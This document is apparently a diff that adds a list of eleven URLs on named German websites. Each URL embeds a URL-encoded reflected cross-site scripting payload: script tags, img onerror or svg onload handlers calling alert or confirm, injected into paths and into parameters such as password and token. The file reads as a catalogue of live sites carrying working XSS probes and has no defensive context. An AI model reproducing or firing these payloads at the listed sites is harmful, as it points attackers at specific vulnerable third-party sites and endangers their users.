@@ -1,0 +1,11 @@
+http://christus-gemeinde-dieburg.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://climos.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://cloud.carolaehler.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://cms.gau-weissenburg.de/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
+http://coavio.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://cobimall.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://cofinimo.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://collegiummusicum.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+https://coesfeld-anzeiger.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://coffema.agn.jacob-hh.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+https://coffema-dev.agn.jacob-hh.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
